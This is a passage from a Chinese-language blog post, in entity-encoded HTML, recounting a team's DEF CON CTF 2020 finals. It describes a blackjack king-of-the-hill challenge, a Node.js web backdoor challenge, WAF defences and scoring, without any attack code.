p+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true" alt></p><p>&#x5728; Golly &#x4E0A;&#x778E;&#x5F04;&#x66F4;&#x662F;&#x76F8;&#x5F53;&#x61F5;&#x903C;&#x3002;&#x867D;&#x7136;&#x9006;&#x5411;&#x5E2E;&#x4E0D;&#x4E0A;&#x5565;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x8FD8;&#x662F;&#x6BCF;&#x4E2A; ROUND &#x90FD;&#x770B;&#x4E00;&#x770B;&#x5404;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x8868;&#x73B0;&#x4EE5;&#x53CA;&#x7B56;&#x7565;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x611F;&#x89C9;&#x4E5F;&#x53EF;&#x80FD;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B66;&#x671F;&#x671B;&#x9898;&#xFF08;&#xFF1F;&#xFF09;&#xFF0C;&#x6211;&#x5C31;&#x5C1D;&#x8BD5;&#x7740;&#x7B97;&#x4E00;&#x4E0B;&#x6BCF;&#x6B21;&#x4E0B;&#x6CE8;&#x591A;&#x5C11;&#x624D;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x6BCF;&#x4E2A; ROUND &#x5927;&#x6982;&#x7387;&#x80FD;&#x5728;&#x73B0;&#x6709;&#x7684;&#x961F;&#x4F0D;&#x7B56;&#x7565;&#x4E2D;&#x80DC;&#x51FA;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x4E0D;&#x65AD;&#x7684;&#x8BD5;&#x4E0D;&#x65AD;&#x7684;&#x6539;&#xFF0C;&#x540E;&#x9762;&#x57FA;&#x672C;&#x4E0A;&#x9760;&#x8FD0;&#x6C14;&#x80FD;&#x62FF;&#x4E0B;&#x4E0D;&#x5C11;&#x5206;&#xFF08;</p><p>&#x540E;&#x9762;&#x6211;&#x4EEC; AWD &#x5206;&#x6570;&#x4E5F;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x622A;&#x6B62;&#x5230; Shift 2 &#x7ED3;&#x675F;&#xFF0C;&#x6211;&#x622A;&#x4E86;&#x4E00;&#x5F20;&#x5F53;&#x65F6;&#x7684;&#x56FE;&#x3002;&#xFF08;&#x770B;&#x7740;&#x5F53;&#x65F6;&#x7684; KOH &#x611F;&#x89C9;&#x5F53;&#x65F6;&#x8FD0;&#x6C14;&#x771F;&#x597D;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png" alt></p><p>&#x540E;&#x9762;&#x5728; Shift 3 &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E2A; 21 &#x70B9;&#x7684;&#x9898;&#x76EE;&#x4E00;&#x5F00;&#x59CB;&#x6CA1;&#x591A;&#x4E45;&#x5C31;&#x4E0B;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x53C8;&#x5F00;&#x59CB;&#x6DF7;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x968F;&#x4FBF;&#x770B;&#x770B;&#x5E73;&#x53F0;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x770B;&#x961F;&#x53CB;&#x4EEC;&#x5728;&#x5E72;&#x5565;&#xFF0C;&#x4E2D;&#x95F4;&#x8C8C;&#x4F3C;&#x6709;&#x4E00;&#x4E2A; RPG &#x6E38;&#x620F;&#x7684; AWD &#x9898;&#x76EE;&#xFF0C;&#x5F53;&#x65F6;&#x770B;&#x4ED6;&#x4EEC;&#x73A9;&#x8D77;&#x6765;&#x611F;&#x89C9;&#x5F88;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x5C31;&#x662F;&#x5927;&#x5BB6;&#x901A;&#x8FC7;&#x64CD;&#x63A7;&#x81EA;&#x5DF1;&#x7684;&#x89D2;&#x8272;&#x8FDB;&#x884C;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x62FF; Flag &#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x662F;&#x5177;&#x6709;&#x4E00;&#x5B9A;&#x5B9E;&#x65F6;&#x64CD;&#x4F5C;&#x6027;&#xFF0C;&#x603B;&#x4E4B;&#x770B;&#x8D77;&#x6765;&#x4ED6;&#x4EEC;&#x5728;&#x6253;&#x8FD9;&#x4E2A;&#x6E38;&#x620F;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D; XD</p><p>&#x7136;&#x540E;&#x540E;&#x9762;&#x53C8;&#x653E;&#x4E86;&#x4E24;&#x4E2A; KOH &#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x975E;&#x5E38; Geek &#x7684;&#x5F39;&#x7403;&#x6E38;&#x620F;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x5F00;&#x98DE;&#x8239;&#x6253;&#x98DE;&#x8239;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x4E24;&#x4E2A;&#x90FD;&#x662F;&#x9006;&#x5411;&#xFF0C;&#x4E5F;&#x8BA9;&#x6211;&#x6DF7;&#x7684;&#x662F;&#x7406;&#x76F4;&#x6C14;&#x58EE;&#xFF08;&#x5927;&#x96FE;&#xFF09;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x60F3;&#x5C3D;&#x53EF;&#x80FD;&#x5730;&#x5E2E;&#x5FD9;&#xFF0C;&#x4F46;&#x662F;&#x771F;&#x662F;&#x83DC;&#x7684;&#x771F;&#x5B9E;&#xFF0C;&#x4E5F;&#x5C31;&#x5230;&#x5904;&#x770B;&#x770B;&#x6709;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x5E2E;&#x5FD9;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x62FF;&#x5916;&#x5356;&#xFF08;&#x6D77;&#x76D7;&#x867E;&#x996D;&#x5916;&#x5356;&#x662F;&#x771F;&#x597D;&#x5403;&#xFF0C;&#x6CE1;&#x9762;&#x771F;&#x9999;&#xFF0C;&#x597D;&#x4E45;&#x6CA1;&#x5403;&#x6CE1;&#x9762;&#x4E86;&#xFF0C;&#x545C;&#x545C;&#x545C;TAT&#xFF09;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg" alt></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg" alt></p><p>&#x662F;&#x6211;&#x672C;&#x4EBA;&#x6CA1;&#x9519;&#x4E86;&#xFF08;</p><p>&#x540E;&#x9762;&#x4E3B;&#x529E;&#x65B9;&#x516C;&#x5E03;&#x4E86; 21 &#x70B9;&#x7684; WriteUp: <a href="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack</a> </p><p>&#x867D;&#x7136;&#x6CA1;&#x600E;&#x4E48;&#x770B;&#x61C2;&#x9006;&#x5411;&#x90E8;&#x5206;&#xFF0C;&#x4F46;&#x662F;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x90A3;&#x4E2A;&#x6539;&#x4E0B;&#x6CE8;&#x5206;&#x6570;&#x7684;&#x505A;&#x6CD5;&#x662F;&#x89E3;&#x6CD5;&#x4E4B;&#x4E00;&#xFF0C;&#x5E76;&#x4E14;&#x5176;&#x4ED6;&#x89E3;&#x6CD5;&#x770B;&#x8D77;&#x6765;&#x4E5F;&#x662F;&#x633A;&#x6709;&#x610F;&#x601D;&#x7684;&#x3002;</p><h2 id="Shift-4"><a href="#Shift-4" class="headerlink" title="Shift 4"></a>Shift 4</h2><p>&#x5728;&#x6700;&#x540E;&#x4E00;&#x5929;&#x5F00;&#x59CB;&#x51E0;&#x5C0F;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4E3B;&#x529E;&#x65B9;&#x7EC8;&#x4E8E;&#x653E;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x672C;&#x573A;&#x552F;&#x4E00;&#x4E00;&#x4E2A; Web &#xFF0C;&#x9898;&#x76EE;&#x5730;&#x5740;&#x5728; <a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">dc2020f-nooode-public</a> &#xFF0C;&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x6211;&#x5F15;&#x7528; PPP &#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x8BC4;&#x4EF7;&#x2014;&#x2014;&#x201C;By the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing <strong>silly web</strong> problems near the end of the competition, and this year was no exception.&#x201D;&#xFF08;&#x6B64;&#x5904;&#x91C7;&#x7528;&#x4E86;&#x5F15;&#x7528;&#x8BBA;&#x8BC1;&#xFF0C;&#x5F15;&#x7528;&#x4E86;&#x6BD4;&#x8F83;&#x6743;&#x5A01;&#x7684;&#x4EBA;&#x58EB;&#x5BF9;&#x4E8E;&#x9898;&#x76EE;&#x7684;&#x8BC4;&#x4EF7;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x8BF4;&#x670D;&#x529B;&#xFF09;</p><p>&#x57FA;&#x672C;&#x4E0A;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x4E00;&#x53E5;&#x8BDD;&#x5728; Nodejs &#x4E0A;&#x7684;&#x5B8C;&#x7F8E;&#x4F53;&#x73B0;&#xFF0C;&#x4E8E;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x6709;&#x4EBA;&#x5F00;&#x59CB;&#x76F4;&#x63A5;&#x6253;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x9A6C;&#x4E0A;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x4E2A; Backdooor &#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x4E5F;&#x5F00;&#x59CB;&#x6253;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x8FD9;&#x4E2A; Backdooor &#x771F;&#x7684;&#x662F; silly &#xFF0C;&#x5F88;&#x591A;&#x961F;&#x90FD;&#x8FC5;&#x901F;&#x4FEE;&#x4E86;&#xFF08;&#x9664;&#x4E86; pasten &#x8C8C;&#x4F3C;&#x6CA1;&#x4EBA;&#x53C2;&#x8D5B;&#xFF09;&#xFF0C;&#x540E;&#x9762;&#x4E5F;&#x5C31;&#x6CA1;&#x4EC0;&#x4E48;&#x6253;&#x6CD5;&#x4E86;&#x3002;&#x540E;&#x9762;&#x901A;&#x8FC7;&#x6211;&#x4EEC;&#x961F;&#x91CC;&#x5DE8;&#x5F3A;&#x7684;&#x67D0;&#x5E08;&#x5085;&#x4E0A;&#x4E86;&#x4ED6;&#x5199;&#x7684;&#x5DE8;&#x5F3A;&#x7684; WAF &#xFF0C;&#x6211;&#x4EEC;&#x62E5;&#x6709;&#x4E86;&#x5DE8;&#x5F3A;&#x7684;&#x9632;&#x5B88;&#x80FD;&#x529B;&#x3002;</p><p>&#x4E8E;&#x662F;&#x5C31;&#x8DDF; A0E &#x67D0;&#x5E08;&#x5085;&#x5C2C;&#x804A;&#x4E86;&#xFF0C;</p><p>But &#x6BD4;&#x8D5B;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6709;&#x4E00;&#x8F6E;&#x7A81;&#x7136;&#x6211;&#x4EEC;&#x53C8;&#x53EF;&#x4EE5;&#x6253;&#x5F88;&#x591A;&#x961F;&#xFF0C;&#x7A81;&#x7136;&#x53D1;&#x73B0;&#x4E3B;&#x529E;&#x65B9;&#x8C8C;&#x4F3C;&#x53C8;&#x5728;&#x6CA1;&#x63D0;&#x524D;&#x901A;&#x77E5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF08;&#x4E5F;&#x597D;&#x50CF;&#x662F;&#x901A;&#x77E5;&#x4E86;&#x6211;&#x6CA1;&#x6CE8;&#x610F;&#xFF09;&#x91CD;&#x7F6E;&#x4E86;&#x5404;&#x961F;&#x4F0D;&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x4E86;&#x53C8;&#x7ACB;&#x9A6C;&#x4FEE;&#x4E86;&#x4E00;&#x6CE2;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x662F;&#x52A0;&#x5F3A;&#x4E86; Check &#xFF0C;&#x53EA;&#x80FD;&#x628A;&#x8D85;&#x5F3A;&#x5E08;&#x5085;&#x5199;&#x7684;&#x8D85;&#x5F3A; WAF &#x778E;&#x6389;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x53C8;&#x6389;&#x4E86;&#x4E00;&#x4E9B;&#x5206;&#xFF08;</p><p>But &#x6BD4;&#x8D5B;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x6709;&#x4E00;&#x4E2A;&#x975E; Web AWD &#x9898;&#x76EE;&#x63D0;&#x4EA4;&#x7684; Patch &#x6CA1;&#x901A;&#x8FC7;&#x800C;&#x4E3B;&#x529E;&#x65B9;&#x6CA1;&#x901A;&#x77E5;&#x6211;&#x4EEC;&#x5C31;&#x7ACB;&#x9A6C;&#x65AD;&#x4E86;&#x6211;&#x4EEC;&#x8DF3;&#x677F;&#x673A;&#x7F51;&#x7EDC;&#xFF0C;&#x5BFC;&#x81F4;&#x5F71;&#x54CD;&#x4E86;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x4E24;&#x8F6E;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>Web &#x540E;&#x9762;&#x4F1A;&#x5355;&#x72EC;&#x505A;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#xFF0C;Web &#x9898;&#x6BD4;&#x8F83;&#x8BA9;&#x6211;&#x610F;&#x5916;&#x7684;&#x662F;&#xFF0C;A0E &#x4ED6;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x88AB;&#x6211;&#x4EEC;&#x7684;&#x8D85;&#x7EA7;&#x5927;&#x5E08;&#x5085;&#x624B;&#x52A8;&#x7ED5;&#x4E86;&#xFF0C;&#x6253;&#x4E86;&#x4E24;&#x56DE;&#x5408;&#x5C31;&#x88AB;&#x4FEE;&#x4E86;&#xFF0C;&#x8FD9;&#x4E5F;&#x6210;&#x4E86;&#x540E;&#x9762;&#x7684;&#x4E00;&#x4E2A;&#x4F0F;&#x7B14;&#x3002;&#xFF08;&#x67D0;&#x4E2A;&#x6E23;&#x7537;&#x7ADF;&#x7136;&#x8DDF;&#x6211;&#x8BF4;&#x8981;&#x7761;&#x4E86;&#x5374;&#x8FD8;&#x5728;&#x770B;&#x6D41;&#x91CF;</p><p>Stealth Port &#x7684;&#x6D41;&#x91CF;&#x5B98;&#x65B9;&#x4E5F;&#x516C;&#x5E03;&#x4E86;&#xFF1A;<a href="https://oooverflow.io/dc-ctf-2020-finals/stealth.txt" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/stealth.txt</a> &#xFF0C;&#x867D;&#x7136;&#x770B;&#x7684;&#x6709;&#x70B9;&#x8FF7;&#x60D1;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6700;&#x540E;&#x6211;&#x4EEC; Web &#x786E;&#x5B9E;&#x6253;&#x4E86;&#x4ED6;&#x4EEC;&#x4E00;&#x6CE2;&#x3002;</p><p>&#x540E;&#x9762;&#x5C01;&#x699C;&#x7136;&#x540E;&#x5230;&#x7ED3;&#x675F;&#xFF0C;&#x57FA;&#x672C;&#x5C31;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x64CD;&#x4F5C;&#x4E86;&#xFF0C;&#x5C01;&#x699C;&#x524D;&#x6211;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x5206;&#x6570;&#x5DEE;&#x8DDD;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x6211;&#x4EEC;&#x662F;&#x5E94;&#x8BE5;&#x8DDF; HITCON &#x4E89;&#x7B2C;&#x4E09;&#xFF0C;PPP &#x8DDF; A0E 